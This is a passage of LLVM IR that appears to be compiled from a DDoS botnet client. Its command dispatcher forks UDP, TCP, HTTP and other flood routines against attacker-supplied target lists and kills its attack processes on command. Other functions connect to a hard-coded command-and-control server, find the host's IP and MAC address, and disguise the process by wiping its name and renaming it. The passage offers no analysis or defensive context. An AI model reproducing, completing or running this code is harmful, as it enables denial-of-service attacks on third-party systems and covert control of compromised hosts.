  %276 = phi i32 [ %265, %271 ], [ %265, %266 ], [ %265, %262 ], [ 1000, %254 ]
  %277 = phi i32 [ %274, %271 ], [ 0, %266 ], [ 0, %262 ], [ 0, %254 ]
  %strchr = tail call i8* @strchr(i8* %256, i32 44)
  %278 = icmp eq i8* %strchr, null
  br i1 %278, label %285, label %.preheader.preheader

.preheader.preheader:                             ; preds = %.thread241
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %281
  %.sink = phi i8* [ null, %281 ], [ %256, %.preheader.preheader ]
  %279 = tail call i8* @strtok(i8* %.sink, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i64 0, i64 0)) #3
  %280 = icmp eq i8* %279, null
  br i1 %280, label %.loopexit.loopexit, label %281

; <label>:281:                                    ; preds = %.preheader
  %282 = tail call i32 @listFork()
  %283 = icmp eq i32 %282, 0
  br i1 %283, label %284, label %.preheader

; <label>:284:                                    ; preds = %281
  tail call void @sendUDP(i8* nonnull %279, i32 %257, i32 %258, i32 %259, i32 %260, i32 %276, i32 %275, i32 %277)
  tail call void @_exit(i32 0) #17
  unreachable

; <label>:285:                                    ; preds = %.thread241
  %286 = tail call i32 @listFork()
  %287 = icmp eq i32 %286, 0
  br i1 %287, label %288, label %.loopexit

; <label>:288:                                    ; preds = %285
  tail call void @sendUDP(i8* %256, i32 %257, i32 %258, i32 %259, i32 %260, i32 %276, i32 %275, i32 %277)
  tail call void @_exit(i32 0) #17
  unreachable

; <label>:289:                                    ; preds = %218
  %290 = tail call i32 @strcmp(i8* %219, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.530, i64 0, i64 0)) #15
  %291 = icmp eq i32 %290, 0
  br i1 %291, label %292, label %.loopexit251

; <label>:292:                                    ; preds = %289
  %293 = icmp slt i32 %0, 6
  br i1 %293, label %.loopexit, label %294

; <label>:294:                                    ; preds = %292
  %295 = getelementptr inbounds i8*, i8** %1, i64 3
  %296 = load i8*, i8** %295, align 8
  %297 = tail call i32 @atoi(i8* %296) #15
  %298 = icmp eq i32 %297, -1
  br i1 %298, label %.loopexit, label %299

; <label>:299:                                    ; preds = %294
  %300 = getelementptr inbounds i8*, i8** %1, i64 2
  %301 = load i8*, i8** %300, align 8
  %302 = tail call i32 @atoi(i8* %301) #15
  %303 = icmp eq i32 %302, -1
  br i1 %303, label %.loopexit, label %304

; <label>:304:                                    ; preds = %299
  %305 = getelementptr inbounds i8*, i8** %1, i64 4
  %306 = load i8*, i8** %305, align 8
  %307 = tail call i32 @atoi(i8* %306) #15
  %308 = icmp eq i32 %307, -1
  %309 = icmp sgt i32 %307, 32
  %or.cond236 = or i1 %308, %309
  br i1 %or.cond236, label %.loopexit, label %310

; <label>:310:                                    ; preds = %304
  %311 = icmp sgt i32 %0, 6
  br i1 %311, label %312, label %.thread242

; <label>:312:                                    ; preds = %310
  %313 = getelementptr inbounds i8*, i8** %1, i64 6
  %314 = load i8*, i8** %313, align 8
  %315 = tail call i32 @atoi(i8* %314) #15
  %316 = icmp slt i32 %315, 0
  br i1 %316, label %.loopexit, label %317

; <label>:317:                                    ; preds = %312
  %318 = icmp eq i32 %0, 8
  br i1 %318, label %319, label %.thread242

; <label>:319:                                    ; preds = %317
  %320 = getelementptr inbounds i8*, i8** %1, i64 7
  %321 = load i8*, i8** %320, align 8
  %322 = tail call i32 @atoi(i8* %321) #15
  %323 = icmp slt i32 %322, 1
  br i1 %323, label %.loopexit, label %.thread242

.thread242:                                       ; preds = %310, %319, %317
  %324 = phi i1 [ true, %319 ], [ false, %317 ], [ false, %310 ]
  %325 = getelementptr inbounds i8*, i8** %1, i64 1
  %326 = load i8*, i8** %325, align 8
  %327 = tail call i32 @atoi(i8* %301) #15
  %328 = tail call i32 @atoi(i8* %296) #15
  %329 = tail call i32 @atoi(i8* %306) #15
  %330 = getelementptr inbounds i8*, i8** %1, i64 5
  %331 = load i8*, i8** %330, align 8
  br i1 %324, label %332, label %336

; <label>:332:                                    ; preds = %.thread242
  %333 = getelementptr inbounds i8*, i8** %1, i64 7
  %334 = load i8*, i8** %333, align 8
  %335 = tail call i32 @atoi(i8* %334) #15
  br label %336

; <label>:336:                                    ; preds = %.thread242, %332
  %337 = phi i32 [ %335, %332 ], [ 10, %.thread242 ]
  br i1 %311, label %338, label %342

; <label>:338:                                    ; preds = %336
  %339 = getelementptr inbounds i8*, i8** %1, i64 6
  %340 = load i8*, i8** %339, align 8
  %341 = tail call i32 @atoi(i8* %340) #15
  br label %342

; <label>:342:                                    ; preds = %336, %338
  %343 = phi i32 [ %341, %338 ], [ 0, %336 ]
  %strchr230 = tail call i8* @strchr(i8* %326, i32 44)
  %344 = icmp eq i8* %strchr230, null
  br i1 %344, label %351, label %.preheader250.preheader

.preheader250.preheader:                          ; preds = %342
  br label %.preheader250

.preheader250:                                    ; preds = %.preheader250.preheader, %347
  %.sink237 = phi i8* [ null, %347 ], [ %326, %.preheader250.preheader ]
  %345 = tail call i8* @strtok(i8* %.sink237, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i64 0, i64 0)) #3
  %346 = icmp eq i8* %345, null
  br i1 %346, label %.loopexit251.loopexit, label %347

; <label>:347:                                    ; preds = %.preheader250
  %348 = tail call i32 @listFork()
  %349 = icmp eq i32 %348, 0
  br i1 %349, label %350, label %.preheader250

; <label>:350:                                    ; preds = %347
  tail call void @sendTCP(i8* nonnull %345, i32 %327, i32 %328, i32 %329, i8* %331, i32 %343, i32 %337)
  tail call void @_exit(i32 0) #17
  unreachable

; <label>:351:                                    ; preds = %342
  %352 = tail call i32 @listFork()
  %353 = icmp eq i32 %352, 0
  br i1 %353, label %354, label %.loopexit251

; <label>:354:                                    ; preds = %351
  tail call void @sendTCP(i8* %326, i32 %327, i32 %328, i32 %329, i8* %331, i32 %343, i32 %337)
  tail call void @_exit(i32 0) #17
  unreachable

.loopexit251.loopexit:                            ; preds = %.preheader250
  br label %.loopexit251

.loopexit251:                                     ; preds = %.loopexit251.loopexit, %351, %289
  %355 = load i8*, i8** %1, align 8
  %356 = tail call i32 @strcmp(i8* %355, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.531, i64 0, i64 0)) #15
  %357 = icmp eq i32 %356, 0
  br i1 %357, label %358, label %.loopexit249

; <label>:358:                                    ; preds = %.loopexit251
  %359 = icmp slt i32 %0, 6
  br i1 %359, label %.loopexit, label %360

; <label>:360:                                    ; preds = %358
  %361 = getelementptr inbounds i8*, i8** %1, i64 1
  %362 = load i8*, i8** %361, align 8
  %strchr231 = tail call i8* @strchr(i8* %362, i32 44)
  %363 = icmp eq i8* %strchr231, null
  br i1 %363, label %385, label %.preheader248.preheader

.preheader248.preheader:                          ; preds = %360
  br label %.preheader248

.preheader248:                                    ; preds = %.preheader248.preheader, %366
  %.sink238 = phi i8* [ null, %366 ], [ %362, %.preheader248.preheader ]
  %364 = tail call i8* @strtok(i8* %.sink238, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i64 0, i64 0)) #3
  %365 = icmp eq i8* %364, null
  br i1 %365, label %.loopexit249.loopexit, label %366

; <label>:366:                                    ; preds = %.preheader248
  %367 = tail call i32 @listFork()
  %368 = icmp eq i32 %367, 0
  br i1 %368, label %369, label %.preheader248

; <label>:369:                                    ; preds = %366
  %370 = load i8*, i8** %361, align 8
  %371 = getelementptr inbounds i8*, i8** %1, i64 2
  %372 = load i8*, i8** %371, align 8
  %373 = getelementptr inbounds i8*, i8** %1, i64 3
  %374 = load i8*, i8** %373, align 8
  %375 = tail call i32 @atoi(i8* %374) #15
  %376 = trunc i32 %375 to i16
  %377 = getelementptr inbounds i8*, i8** %1, i64 4
  %378 = load i8*, i8** %377, align 8
  %379 = getelementptr inbounds i8*, i8** %1, i64 5
  %380 = load i8*, i8** %379, align 8
  %381 = tail call i32 @atoi(i8* %380) #15
  %382 = getelementptr inbounds i8*, i8** %1, i64 6
  %383 = load i8*, i8** %382, align 8
  %384 = tail call i32 @atoi(i8* %383) #15
  tail call void @sendHTTP(i8* %370, i8* %372, i16 zeroext %376, i8* %378, i32 %381, i32 %384)
  tail call void @_exit(i32 0) #17
  unreachable

; <label>:385:                                    ; preds = %360
  %386 = tail call i32 @listFork()
  %387 = icmp eq i32 %386, 0
  br i1 %387, label %388, label %.loopexit

; <label>:388:                                    ; preds = %385
  %389 = load i8*, i8** %361, align 8
  %390 = getelementptr inbounds i8*, i8** %1, i64 2
  %391 = load i8*, i8** %390, align 8
  %392 = getelementptr inbounds i8*, i8** %1, i64 3
  %393 = load i8*, i8** %392, align 8
  %394 = tail call i32 @atoi(i8* %393) #15
  %395 = trunc i32 %394 to i16
  %396 = getelementptr inbounds i8*, i8** %1, i64 4
  %397 = load i8*, i8** %396, align 8
  %398 = getelementptr inbounds i8*, i8** %1, i64 5
  %399 = load i8*, i8** %398, align 8
  %400 = tail call i32 @atoi(i8* %399) #15
  %401 = getelementptr inbounds i8*, i8** %1, i64 6
  %402 = load i8*, i8** %401, align 8
  %403 = tail call i32 @atoi(i8* %402) #15
  tail call void @sendHTTP(i8* %389, i8* %391, i16 zeroext %395, i8* %397, i32 %400, i32 %403)
  tail call void @_exit(i32 0) #17
  unreachable

.loopexit249.loopexit:                            ; preds = %.preheader248
  %.pre272 = load i8*, i8** %1, align 8
  br label %.loopexit249

.loopexit249:                                     ; preds = %.loopexit249.loopexit, %.loopexit251
  %404 = phi i8* [ %.pre272, %.loopexit249.loopexit ], [ %355, %.loopexit251 ]
  %405 = tail call i32 @strcmp(i8* %404, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.532, i64 0, i64 0)) #15
  %406 = icmp eq i32 %405, 0
  br i1 %406, label %407, label %.loopexit247

; <label>:407:                                    ; preds = %.loopexit249
  %408 = icmp slt i32 %0, 4
  br i1 %408, label %.loopexit, label %409

; <label>:409:                                    ; preds = %407
  %410 = getelementptr inbounds i8*, i8** %1, i64 2
  %411 = load i8*, i8** %410, align 8
  %412 = tail call i32 @atoi(i8* %411) #15
  %413 = icmp slt i32 %412, 1
  br i1 %413, label %.loopexit, label %414

; <label>:414:                                    ; preds = %409
  %415 = getelementptr inbounds i8*, i8** %1, i64 3
  %416 = load i8*, i8** %415, align 8
  %417 = tail call i32 @atoi(i8* %416) #15
  %418 = icmp slt i32 %417, 1
  br i1 %418, label %.loopexit, label %419

; <label>:419:                                    ; preds = %414
  %420 = getelementptr inbounds i8*, i8** %1, i64 1
  %421 = load i8*, i8** %420, align 8
  %strchr232 = tail call i8* @strchr(i8* %421, i32 44)
  %422 = icmp eq i8* %strchr232, null
  br i1 %422, label %431, label %.preheader246.preheader

.preheader246.preheader:                          ; preds = %419
  br label %.preheader246

.preheader246:                                    ; preds = %.preheader246.preheader, %425
  %.sink239 = phi i8* [ null, %425 ], [ %421, %.preheader246.preheader ]
  %423 = tail call i8* @strtok(i8* %.sink239, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i64 0, i64 0)) #3
  %424 = icmp eq i8* %423, null
  br i1 %424, label %.loopexit247.loopexit, label %425

; <label>:425:                                    ; preds = %.preheader246
  %426 = tail call i32 @listFork()
  %427 = icmp eq i32 %426, 0
  br i1 %427, label %428, label %.preheader246

; <label>:428:                                    ; preds = %425
  tail call void @sendCNC(i8* nonnull %423, i32 %412, i32 %417)
  %429 = load i32, i32* @mainCommSock, align 4
  %430 = tail call i32 @close(i32 %429) #3
  tail call void @_exit(i32 0) #17
  unreachable

; <label>:431:                                    ; preds = %419
  %432 = tail call i32 @listFork()
  %433 = icmp eq i32 %432, 0
  br i1 %433, label %434, label %.loopexit

; <label>:434:                                    ; preds = %431
  tail call void @sendCNC(i8* %421, i32 %412, i32 %417)
  tail call void @_exit(i32 0) #17
  unreachable

.loopexit247.loopexit:                            ; preds = %.preheader246
  %.pre273 = load i8*, i8** %1, align 8
  br label %.loopexit247

.loopexit247:                                     ; preds = %.loopexit247.loopexit, %.loopexit249
  %435 = phi i8* [ %.pre273, %.loopexit247.loopexit ], [ %404, %.loopexit249 ]
  %436 = tail call i32 @strcmp(i8* %435, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.533, i64 0, i64 0)) #15
  %437 = icmp eq i32 %436, 0
  br i1 %437, label %438, label %.loopexit245

; <label>:438:                                    ; preds = %.loopexit247
  %439 = icmp slt i32 %0, 4
  br i1 %439, label %.loopexit, label %440

; <label>:440:                                    ; preds = %438
  %441 = getelementptr inbounds i8*, i8** %1, i64 2
  %442 = load i8*, i8** %441, align 8
  %443 = tail call i32 @atoi(i8* %442) #15
  %444 = icmp slt i32 %443, 1
  br i1 %444, label %.loopexit, label %445

; <label>:445:                                    ; preds = %440
  %446 = getelementptr inbounds i8*, i8** %1, i64 3
  %447 = load i8*, i8** %446, align 8
  %448 = tail call i32 @atoi(i8* %447) #15
  %449 = icmp slt i32 %448, 1
  br i1 %449, label %.loopexit, label %450

; <label>:450:                                    ; preds = %445
  %451 = getelementptr inbounds i8*, i8** %1, i64 1
  %452 = load i8*, i8** %451, align 8
  %strchr233 = tail call i8* @strchr(i8* %452, i32 44)
  %453 = icmp eq i8* %strchr233, null
  br i1 %453, label %460, label %.preheader244.preheader

.preheader244.preheader:                          ; preds = %450
  br label %.preheader244

.preheader244:                                    ; preds = %.preheader244.preheader, %456
  %.sink240 = phi i8* [ null, %456 ], [ %452, %.preheader244.preheader ]
  %454 = tail call i8* @strtok(i8* %.sink240, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i64 0, i64 0)) #3
  %455 = icmp eq i8* %454, null
  br i1 %455, label %.loopexit245.loopexit, label %456

; <label>:456:                                    ; preds = %.preheader244
  %457 = tail call i32 @listFork()
  %458 = icmp eq i32 %457, 0
  br i1 %458, label %459, label %.preheader244

; <label>:459:                                    ; preds = %456
  tail call void @sendSTD(i8* nonnull %454, i32 %443, i32 %448)
  unreachable

; <label>:460:                                    ; preds = %450
  %461 = tail call i32 @listFork()
  %462 = icmp eq i32 %461, 0
  br i1 %462, label %463, label %.loopexit

; <label>:463:                                    ; preds = %460
  tail call void @sendSTD(i8* %452, i32 %443, i32 %448)
  unreachable

.loopexit245.loopexit:                            ; preds = %.preheader244
  %.pre274 = load i8*, i8** %1, align 8
  br label %.loopexit245

.loopexit245:                                     ; preds = %.loopexit245.loopexit, %.loopexit247
  %464 = phi i8* [ %.pre274, %.loopexit245.loopexit ], [ %435, %.loopexit247 ]
  %465 = tail call i32 @strcmp(i8* %464, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.534, i64 0, i64 0)) #15
  %466 = icmp eq i32 %465, 0
  br i1 %466, label %.preheader243, label %494

.preheader243:                                    ; preds = %.loopexit245
  %467 = load i64, i64* @numpids, align 8
  %468 = icmp eq i64 %467, 0
  br i1 %468, label %._crit_edge.thread, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader243
  br label %.lr.ph

._crit_edge.thread:                               ; preds = %.preheader243
  %469 = load i32, i32* @mainCommSock, align 4
  br label %491

.lr.ph:                                           ; preds = %.lr.ph.preheader, %483
  %.0257 = phi i64 [ %484, %483 ], [ 0, %.lr.ph.preheader ]
  %.0204256 = phi i32 [ %.1, %483 ], [ 0, %.lr.ph.preheader ]
  %470 = load i32*, i32** @pids, align 8
  %471 = getelementptr inbounds i32, i32* %470, i64 %.0257
  %472 = load i32, i32* %471, align 4
  %473 = icmp eq i32 %472, 0
  br i1 %473, label %483, label %474

; <label>:474:                                    ; preds = %.lr.ph
  %475 = tail call i32 @getpid() #3
  %476 = icmp eq i32 %472, %475
  br i1 %476, label %483, label %477

; <label>:477:                                    ; preds = %474
  %478 = load i32*, i32** @pids, align 8
  %479 = getelementptr inbounds i32, i32* %478, i64 %.0257
  %480 = load i32, i32* %479, align 4
  %481 = tail call i32 @kill(i32 %480, i32 9) #3
  %482 = add nsw i32 %.0204256, 1
  br label %483

; <label>:483:                                    ; preds = %474, %.lr.ph, %477
  %.1 = phi i32 [ %482, %477 ], [ %.0204256, %474 ], [ %.0204256, %.lr.ph ]
  %484 = add i64 %.0257, 1
  %485 = load i64, i64* @numpids, align 8
  %486 = icmp ult i64 %484, %485
  br i1 %486, label %.lr.ph, label %._crit_edge

._crit_edge:                                      ; preds = %483
  %487 = icmp sgt i32 %.1, 0
  %488 = load i32, i32* @mainCommSock, align 4
  br i1 %487, label %489, label %491

; <label>:489:                                    ; preds = %._crit_edge
  %490 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %488, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.535, i64 0, i64 0), i32 %.1)
  br label %494

; <label>:491:                                    ; preds = %._crit_edge.thread, %._crit_edge
  %492 = phi i32 [ %469, %._crit_edge.thread ], [ %488, %._crit_edge ]
  %493 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %492, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.536, i64 0, i64 0))
  br label %494

; <label>:494:                                    ; preds = %.loopexit245, %489, %491
  %495 = load i8*, i8** %1, align 8
  %496 = tail call i32 @strcmp(i8* %495, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.537, i64 0, i64 0)) #15
  %497 = icmp eq i32 %496, 0
  br i1 %497, label %498, label %.loopexit

; <label>:498:                                    ; preds = %494
  tail call void @exit(i32 0) #17
  unreachable

.loopexit.loopexit:                               ; preds = %.preheader
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %494, %460, %431, %385, %285, %200, %178, %156, %134, %112, %90, %68, %56, %32, %6, %2, %438, %440, %445, %407, %409, %414, %358, %292, %294, %299, %304, %312, %319, %222, %224, %229, %234, %239, %249, %21, %38, %12
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) local_unnamed_addr #5

; Function Attrs: nounwind readonly
declare i32 @atoi(i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @getpid() local_unnamed_addr #5

; Function Attrs: noreturn nounwind
declare void @exit(i32) local_unnamed_addr #13

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() local_unnamed_addr #1 {
  %1 = alloca [4096 x i8], align 16
  %2 = getelementptr inbounds [4096 x i8], [4096 x i8]* %1, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %2, i8 0, i64 4096, i32 16, i1 false)
  %3 = load i32, i32* @mainCommSock, align 4
  %4 = icmp eq i32 %3, 0
  br i1 %4, label %7, label %5

; <label>:5:                                      ; preds = %0
  %6 = tail call i32 @close(i32 %3) #3
  store i32 0, i32* @mainCommSock, align 4
  br label %7

; <label>:7:                                      ; preds = %0, %5
  %8 = load i32, i32* @currentServer, align 4
  %9 = add nsw i32 %8, 1
  %10 = icmp eq i32 %8, 0
  %.sink = select i1 %10, i32 0, i32 %9
  store i32 %.sink, i32* @currentServer, align 4
  %11 = sext i32 %.sink to i64
  %12 = getelementptr inbounds [1 x i8*], [1 x i8*]* @PromServer, i64 0, i64 %11
  %13 = load i8*, i8** %12, align 8
  %14 = call i8* @strcpy(i8* nonnull %2, i8* %13) #3
  %15 = call i8* @strchr(i8* nonnull %2, i32 58) #15
  %16 = icmp eq i8* %15, null
  br i1 %16, label %20, label %17

; <label>:17:                                     ; preds = %7
  %18 = getelementptr inbounds i8, i8* %15, i64 1
  %19 = call i32 @atoi(i8* %18) #15
  store i8 0, i8* %15, align 1
  br label %20

; <label>:20:                                     ; preds = %7, %17
  %.0 = phi i32 [ %19, %17 ], [ 27, %7 ]
  %21 = call i32 @socket(i32 2, i32 1, i32 0) #3
  store i32 %21, i32* @mainCommSock, align 4
  %22 = call i32 @connectTimeout(i32 %21, i8* nonnull %2, i32 %.0, i32 30)
  %23 = icmp eq i32 %22, 0
  %. = zext i1 %23 to i32
  ret i32 %.
}

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() local_unnamed_addr #1 {
  %1 = alloca %struct.sockaddr_in, align 4
  %2 = alloca %struct.sockaddr_in, align 4
  %3 = alloca i32, align 4
  %4 = alloca [4096 x i8], align 16
  %5 = alloca %struct.ifreq, align 8
  %6 = tail call i32 @socket(i32 2, i32 2, i32 0) #3
  %7 = icmp eq i32 %6, -1
  br i1 %7, label %46, label %8

; <label>:8:                                      ; preds = %0
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 3, i64 0
  %10 = bitcast i8* %9 to i64*
  store i64 0, i64* %10, align 4
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 0
  store i16 2, i16* %11, align 4
  %12 = tail call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.538, i64 0, i64 0)) #3
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 2, i32 0
  store i32 %12, i32* %13, align 4
  %14 = tail call zeroext i16 @htons(i16 zeroext 53) #18
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 1
  store i16 %14, i16* %15, align 2
  %16 = bitcast %struct.sockaddr_in* %1 to %struct.sockaddr*
  %17 = call i32 @connect(i32 %6, %struct.sockaddr* nonnull %16, i32 16) #3
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %46, label %19

; <label>:19:                                     ; preds = %8
  store i32 16, i32* %3, align 4
  %20 = bitcast %struct.sockaddr_in* %2 to %struct.sockaddr*
  %21 = call i32 @getsockname(i32 %6, %struct.sockaddr* nonnull %20, i32* nonnull %3) #3
  %22 = icmp eq i32 %21, -1
  br i1 %22, label %46, label %23

; <label>:23:                                     ; preds = %19
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 2, i32 0
  %25 = load i32, i32* %24, align 4
  store i32 %25, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %26 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.539, i64 0, i64 0), i32 0) #3
  %27 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 0
  %28 = call i8* @fdgets(i8* nonnull %27, i32 4096, i32 %26)
  %29 = icmp eq i8* %28, null
  br i1 %29, label %.loopexit17, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %23
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %36
  %30 = call i8* @strstr(i8* nonnull %27, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.540, i64 0, i64 0)) #15
  %31 = icmp eq i8* %30, null
  br i1 %31, label %36, label %.preheader.preheader

.preheader.preheader:                             ; preds = %.lr.ph
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %.preheader
  %.015 = phi i8* [ %34, %.preheader ], [ %27, %.preheader.preheader ]
  %32 = load i8, i8* %.015, align 1
  %33 = icmp eq i8 %32, 9
  %34 = getelementptr inbounds i8, i8* %.015, i64 1
  br i1 %33, label %35, label %.preheader

; <label>:35:                                     ; preds = %.preheader
  store i8 0, i8* %.015, align 1
  br label %.loopexit17

; <label>:36:                                     ; preds = %.lr.ph
  call void @llvm.memset.p0i8.i64(i8* nonnull %27, i8 0, i64 4096, i32 16, i1 false)
  %37 = call i8* @fdgets(i8* nonnull %27, i32 4096, i32 %26)
  %38 = icmp eq i8* %37, null
  br i1 %38, label %.loopexit17.loopexit, label %.lr.ph

.loopexit17.loopexit:                             ; preds = %36
  br label %.loopexit17

.loopexit17:                                      ; preds = %.loopexit17.loopexit, %23, %35
  %39 = call i32 @close(i32 %26) #3
  %40 = load i8, i8* %27, align 16
  %41 = icmp eq i8 %40, 0
  br i1 %41, label %.loopexit, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %.loopexit17
  %42 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %5, i64 0, i32 0, i32 0, i64 0
  %43 = call i8* @strcpy(i8* nonnull %42, i8* nonnull %27) #3
  %44 = call i32 (i32, i64, ...) @ioctl(i32 %6, i64 35111, %struct.ifreq* nonnull %5) #3
  %scevgep = getelementptr inbounds %struct.ifreq, %struct.ifreq* %5, i64 0, i32 1, i32 0, i32 0
  %scevgep20 = bitcast i64* %scevgep to i8*
  %uglygep = getelementptr inbounds i8, i8* %scevgep20, i64 2
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 0), i8* %uglygep, i64 6, i32 1, i1 false)
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.loopexit17
  %45 = call i32 @close(i32 %6) #3
  br label %46

; <label>:46:                                     ; preds = %19, %8, %0, %.loopexit
  ret i32 0
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) local_unnamed_addr #5

; Function Attrs: noinline norecurse nounwind readnone uwtable
define i8* @getBuild() local_unnamed_addr #14 {
  ret i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.541, i64 0, i64 0)
}

; Function Attrs: noinline noreturn nounwind uwtable
define i32 @main(i32, i8** nocapture) local_unnamed_addr #12 {
  %3 = alloca i32, align 4
  %4 = alloca [256 x i8], align 16
  %5 = alloca [256 x i8], align 16
  %6 = alloca [1024 x i8], align 16
  %7 = alloca [4096 x i8], align 16
  %8 = alloca [1024 x i8], align 16
  %9 = alloca [10 x i8*], align 16
  %10 = load i8*, i8** %1, align 8
  %11 = tail call i64 @strlen(i8* %10) #15
  tail call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 %11, i32 1, i1 false)
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.542, i64 0, i64 0), i8** %1, align 8
  %12 = tail call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 ptrtoint ([1 x i8]* @.str.542 to i64), i32 0, i32 0, i32 0) #3
  %13 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %14 = tail call i32 @getpid() #3
  %15 = xor i32 %14, %13
  tail call void @srand(i32 %15) #3
  %16 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %17 = tail call i32 @getpid() #3
  %18 = xor i32 %17, %16
  tail call void @init_rand(i32 %18)
  %19 = tail call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.543, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.544, i64 0, i64 0))
  %20 = icmp eq %struct._IO_FILE* %19, null
  br i1 %20, label %21, label %.thread

; <label>:21:                                     ; preds = %2
  %22 = tail call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.545, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.544, i64 0, i64 0))
  %23 = icmp eq %struct._IO_FILE* %22, null
  br i1 %23, label %60, label %.thread

.thread:                                          ; preds = %2, %21
  %.091106 = phi i8* [ getelementptr inbounds ([13 x i8], [13 x i8]* @.str.545, i64 0, i64 0), %21 ], [ getelementptr inbounds ([19 x i8], [19 x i8]* @.str.543, i64 0, i64 0), %2 ]
  %.096105 = phi %struct._IO_FILE* [ %22, %21 ], [ %19, %2 ]
  %24 = load i8*, i8** %1, align 8
  %25 = tail call i64 @strlen(i8* %24) #15
  %26 = getelementptr inbounds [256 x i8], [256 x i8]* %4, i64 0, i64 0
  %27 = call i8* @getcwd(i8* nonnull %26, i64 256) #3
  %28 = call i32 @strcmp(i8* nonnull %26, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.546, i64 0, i64 0)) #15
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %58, label %.preheader114

.preheader114:                                    ; preds = %.thread
  %30 = load i8*, i8** %1, align 8
  %sext = shl i64 %25, 32
  %31 = ashr exact i64 %sext, 32
  br label %32

; <label>:32:                                     ; preds = %32, %.preheader114
  %indvars.iv160 = phi i64 [ %indvars.iv.next161, %32 ], [ %31, %.preheader114 ]
  %33 = getelementptr inbounds i8, i8* %30, i64 %indvars.iv160
  %34 = load i8, i8* %33, align 1
  %35 = icmp eq i8 %34, 47
  %indvars.iv.next161 = add i64 %indvars.iv160, -1
  br i1 %35, label %36, label %32

; <label>:36:                                     ; preds = %32
  %37 = getelementptr inbounds [256 x i8], [256 x i8]* %5, i64 0, i64 0
  %38 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %37, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.547, i64 0, i64 0), i8* nonnull %26, i8* %33) #3
  %39 = call i32 @feof(%struct._IO_FILE* nonnull %.096105) #3
  %40 = icmp eq i32 %39, 0
  br i1 %40, label %.lr.ph147, label %._crit_edge148.thread

._crit_edge148.thread:                            ; preds = %36
  %41 = call i32 @fclose(%struct._IO_FILE* nonnull %.096105)
  br label %52

.lr.ph147:                                        ; preds = %36
  %42 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  br label %43

; <label>:43:                                     ; preds = %.lr.ph147, %43
  %.099145 = phi i32 [ 0, %.lr.ph147 ], [ %..099, %43 ]
  %44 = call i8* @fgets(i8* nonnull %42, i32 1024, %struct._IO_FILE* nonnull %.096105)
  %45 = call i32 @strcasecmp(i8* nonnull %42, i8* nonnull %37) #15
  %46 = icmp eq i32 %45, 0
  %47 = zext i1 %46 to i32
  %..099 = add nsw i32 %47, %.099145
  %48 = call i32 @feof(%struct._IO_FILE* nonnull %.096105) #3
  %49 = icmp eq i32 %48, 0
